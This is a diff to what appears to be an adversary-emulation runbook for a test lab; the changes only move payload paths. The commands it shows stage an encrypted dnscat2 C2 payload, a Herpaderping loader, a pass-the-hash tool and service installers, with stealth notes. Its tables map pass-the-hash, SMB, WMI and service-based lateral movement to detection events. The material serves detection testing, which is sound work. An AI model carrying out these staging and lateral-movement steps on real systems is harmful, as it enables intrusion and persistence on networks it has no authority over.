@@ -62,14 +62,14 @@ No new exploitation or network exposure is required; the existing
 - ☣️ Re-stage dnscat2 payload with XOR encryption (`CertCA.enc`); first byte on disk `0xEE` (not `0x4D`), no valid MZ header
 
   ```
-  stage --encrypt ../dnscat2/go-client/dnscat2.exe C:\ProgramData\CertCA.enc
+  stage --encrypt ../../rce-and-c2/dnscat2/go-client/dnscat2.exe C:\ProgramData\CertCA.enc
   ```
 
   - ***Expected Output***
 
     ```text
     [*] XOR encoded payload before staging (T1027.013)
-    [*] Staging .../dnscat2.exe (...) -> C:\ProgramData\CertCA.enc in N chunks
+    [*] Staging .../../rce-and-c2/dnscat2.exe (...) -> C:\ProgramData\CertCA.enc in N chunks
     [*] Progress: N/N chunks
     [+] File staged successfully -> C:\ProgramData\CertCA.enc (... bytes)
     ```
@@ -77,14 +77,14 @@ No new exploitation or network exposure is required; the existing
 - ☣️ Stage `CertEnrollAgent` (Herpaderping loader); rename to `.exe`
 
   ```
-  stage ../CWLHerpaderping/x64/Release/CWLHerpaderping.exe C:\ProgramData\CertEnrollAgent.bin
+  stage ../../process-injection/CWLHerpaderping/x64/Release/CWLHerpaderping.exe C:\ProgramData\CertEnrollAgent.bin
   rename C:\ProgramData\CertEnrollAgent.bin C:\ProgramData\CertEnrollAgent.exe
   ```
 
   - ***Expected Output***
 
     ```text
-    [*] Staging .../CWLHerpaderping.exe (...) -> C:\ProgramData\CertEnrollAgent.bin in N chunks...
+    [*] Staging .../../process-injection/CWLHerpaderping.exe (...) -> C:\ProgramData\CertEnrollAgent.bin in N chunks...
     [*] Progress: N/N chunks
     [+] File staged successfully -> C:\ProgramData\CertEnrollAgent.bin (... bytes)
     [*] Renaming C:\ProgramData\CertEnrollAgent.bin -> C:\ProgramData\CertEnrollAgent.exe via eval (NO spawn - STEALTH!)...
@@ -94,14 +94,14 @@ No new exploitation or network exposure is required; the existing
 - ☣️ Stage `go-thehash.exe` (PtH lateral movement tool); rename to `.exe`
 
   ```
-  stage ../go-thehash/go-thehash.exe C:\ProgramData\go-thehash.bin
+  stage ../../lateral-movement/go-thehash/go-thehash.exe C:\ProgramData\go-thehash.bin
   rename C:\ProgramData\go-thehash.bin C:\ProgramData\go-thehash.exe
   ```
 
   - ***Expected Output***
 
     ```text
-    [*] Staging .../go-thehash.exe (...) -> C:\ProgramData\go-thehash.bin in N chunks...
+    [*] Staging .../../lateral-movement/go-thehash.exe (...) -> C:\ProgramData\go-thehash.bin in N chunks...
     [*] Progress: N/N chunks
     [+] File staged successfully -> C:\ProgramData\go-thehash.bin (... bytes)
     [*] Renaming C:\ProgramData\go-thehash.bin -> C:\ProgramData\go-thehash.exe via eval (NO spawn - STEALTH!)...
@@ -111,8 +111,8 @@ No new exploitation or network exposure is required; the existing
 - ☣️ Stage Windows service installer tooling
 
   ```
-  stage ../windows-service/advapi32-cpp/ServiceInstaller.exe C:\ProgramData\ServiceInstaller.bin
-  stage ../windows-service/syscalls-cpp/NtServiceInstaller.exe C:\ProgramData\NtServiceInstaller.bin
+  stage ../../persistence/windows-service/advapi32-cpp/ServiceInstaller.exe C:\ProgramData\ServiceInstaller.bin
+  stage ../../persistence/windows-service/syscalls-cpp/NtServiceInstaller.exe C:\ProgramData\NtServiceInstaller.bin
   ```
 
   - ***Expected Output***
@@ -125,8 +125,8 @@ No new exploitation or network exposure is required; the existing
 - ☣️ Stage C2 executables for persistence mechanisms
 
   ```
-  stage ../dnscat2/go-client/dnscat2.exe C:\ProgramData\policyupdate.bin
-  stage ../dnscat2/go-client/policysync.exe C:\ProgramData\policysync.bin
+  stage ../../rce-and-c2/dnscat2/go-client/dnscat2.exe C:\ProgramData\policyupdate.bin
+  stage ../../rce-and-c2/dnscat2/go-client/policysync.exe C:\ProgramData\policysync.bin
   ```
 
   - ***Expected Output***
@@ -274,11 +274,11 @@ all subsequent commands issued through this dnscat2 session.
 
 | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
 |  - | - | - | - | - | - | - | - | - | - | - | -
-| Lateral Movement | T1550.002 | Use Alternate Authentication Material: Pass the Hash | Windows | `TESTLAB\Administrator` performs Logon Type 3 (NTLM, `LogonProcessName: NtLmSsp`) to DC01 from `10.12.10.20` (IIS01) — Security Event 4624 on DC01; NTLM lateral authentication from web-tier host to domain controller | Calibrated - Not Benign | - | `go-thehash.exe` authenticates to DC01 via raw NT hash; implementation details are covered in [go-thehash.md](../further-reading/go-thehash.md) | react.testlab.local → DC01 | TESTLAB\Administrator | [main.go connect()](../../resources/payloads/go-thehash/main.go) | -
-| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | `TESTLAB\Administrator` accesses `\\DC01\C$` from `10.12.10.20` (IIS01) — Security Event 5140 on DC01; web-tier host opening admin share on domain controller | Not Calibrated - Not Benign | redundant@T1570 | `go-thehash.exe put` uses an authenticated SMB2 session to reach the `C$` admin share; implementation details are covered in [go-thehash.md](../further-reading/go-thehash.md) | react.testlab.local → DC01 | TESTLAB\Administrator | [main.go putFile()](../../resources/payloads/go-thehash/main.go) | -
-| Lateral Movement | T1570 | Lateral Tool Transfer | Windows | `C:\ProgramData\CertEnrollAgent.exe` (valid PE) created on DC01 (`Image: System`) — Sysmon Event 11; PE binary staged to domain controller `C:\ProgramData\` by remote SMB session (source host attributed via correlated Security Event 5145/5140) | Calibrated - Not Benign | - | `go-thehash.exe put` moves the dnscat2 payload and Herpaderping loader from IIS01 to DC01; file-transfer details are covered in [go-thehash.md](../further-reading/go-thehash.md) | react.testlab.local → DC01 | TESTLAB\Administrator | [main.go putFile()](../../resources/payloads/go-thehash/main.go) | -
-| Lateral Movement | T1021.003 | Remote Services: Distributed Component Object Model | Windows | `go-thehash.exe` on IIS01 opens an outbound DCOM connection to DC01 (`10.12.10.10`) port 135 — Sysmon Event 3 on IIS01; web-tier process initiating endpoint-mapper session to domain controller | Calibrated - Not Benign | - | `go-thehash.exe exec-wmi` calls `msdcom.NewDCOMConnection()` — a separate DCOM session independent of the SMB session used for file transfer; this is the transport layer for WMI execution and provides an earlier, independent detection opportunity before `wmiprvse.exe` spawns the payload; implementation details are covered in [go-thehash.md](../further-reading/go-thehash.md) | IIS01 → DC01 | TESTLAB\Administrator | [main.go execViaWMI()](../../resources/payloads/go-thehash/main.go) | -
-| Execution | T1047 | Windows Management Instrumentation | Windows | `wmiprvse.exe` spawns `C:\ProgramData\CertEnrollAgent.exe` on DC01 as `TESTLAB\Administrator` — Sysmon Event 1 on DC01; WMI process creation from a non-standard binary path | Calibrated - Not Benign | - | Path A execution: `go-thehash.exe` calls the WMI COM interface to spawn a remote process on DC01 in the context of the authenticated domain admin account; implementation details are covered in [go-thehash.md](../further-reading/go-thehash.md) | DC01 | TESTLAB\Administrator | [main.go execViaWMI()](../../resources/payloads/go-thehash/main.go) | -
+| Lateral Movement | T1550.002 | Use Alternate Authentication Material: Pass the Hash | Windows | `TESTLAB\Administrator` performs Logon Type 3 (NTLM, `LogonProcessName: NtLmSsp`) to DC01 from `10.12.10.20` (IIS01) — Security Event 4624 on DC01; NTLM lateral authentication from web-tier host to domain controller | Calibrated - Not Benign | - | `go-thehash.exe` authenticates to DC01 via raw NT hash; implementation details are covered in [go-thehash.md](../further-reading/go-thehash.md) | react.testlab.local → DC01 | TESTLAB\Administrator | [main.go connect()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -
+| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | `TESTLAB\Administrator` accesses `\\DC01\C$` from `10.12.10.20` (IIS01) — Security Event 5140 on DC01; web-tier host opening admin share on domain controller | Not Calibrated - Not Benign | redundant@T1570 | `go-thehash.exe put` uses an authenticated SMB2 session to reach the `C$` admin share; implementation details are covered in [go-thehash.md](../further-reading/go-thehash.md) | react.testlab.local → DC01 | TESTLAB\Administrator | [main.go putFile()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -
+| Lateral Movement | T1570 | Lateral Tool Transfer | Windows | `C:\ProgramData\CertEnrollAgent.exe` (valid PE) created on DC01 (`Image: System`) — Sysmon Event 11; PE binary staged to domain controller `C:\ProgramData\` by remote SMB session (source host attributed via correlated Security Event 5145/5140) | Calibrated - Not Benign | - | `go-thehash.exe put` moves the dnscat2 payload and Herpaderping loader from IIS01 to DC01; file-transfer details are covered in [go-thehash.md](../further-reading/go-thehash.md) | react.testlab.local → DC01 | TESTLAB\Administrator | [main.go putFile()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -
+| Lateral Movement | T1021.003 | Remote Services: Distributed Component Object Model | Windows | `go-thehash.exe` on IIS01 opens an outbound DCOM connection to DC01 (`10.12.10.10`) port 135 — Sysmon Event 3 on IIS01; web-tier process initiating endpoint-mapper session to domain controller | Calibrated - Not Benign | - | `go-thehash.exe exec-wmi` calls `msdcom.NewDCOMConnection()` — a separate DCOM session independent of the SMB session used for file transfer; this is the transport layer for WMI execution and provides an earlier, independent detection opportunity before `wmiprvse.exe` spawns the payload; implementation details are covered in [go-thehash.md](../further-reading/go-thehash.md) | IIS01 → DC01 | TESTLAB\Administrator | [main.go execViaWMI()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -
+| Execution | T1047 | Windows Management Instrumentation | Windows | `wmiprvse.exe` spawns `C:\ProgramData\CertEnrollAgent.exe` on DC01 as `TESTLAB\Administrator` — Sysmon Event 1 on DC01; WMI process creation from a non-standard binary path | Calibrated - Not Benign | - | Path A execution: `go-thehash.exe` calls the WMI COM interface to spawn a remote process on DC01 in the context of the authenticated domain admin account; implementation details are covered in [go-thehash.md](../further-reading/go-thehash.md) | DC01 | TESTLAB\Administrator | [main.go execViaWMI()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -
 
 ---
 
@@ -377,7 +377,7 @@ when the service is created and survives later service deletion.
 
 | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
 |  - | - | - | - | - | - | - | - | - | - | - | -
-| Execution | T1569.002 | System Services: Service Execution | Windows | Event 7045 on DC01 System log — service with random 12-character name created with `ImagePath: C:\ProgramData\CertEnrollAgent.exe`, `ObjectName: LocalSystem`; transient service installed and deleted remotely via MS-SCMR | Calibrated - Not Benign | - | `go-thehash.exe exec` creates, starts, and deletes a transient service; SCMR call flow is covered in [go-thehash.md](../further-reading/go-thehash.md) | DC01 | TESTLAB\Administrator | [main.go execViaService()](../../resources/payloads/go-thehash/main.go) | -
+| Execution | T1569.002 | System Services: Service Execution | Windows | Event 7045 on DC01 System log — service with random 12-character name created with `ImagePath: C:\ProgramData\CertEnrollAgent.exe`, `ObjectName: LocalSystem`; transient service installed and deleted remotely via MS-SCMR | Calibrated - Not Benign | - | `go-thehash.exe exec` creates, starts, and deletes a transient service; SCMR call flow is covered in [go-thehash.md](../further-reading/go-thehash.md) | DC01 | TESTLAB\Administrator | [main.go execViaService()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -
 
 ---
 
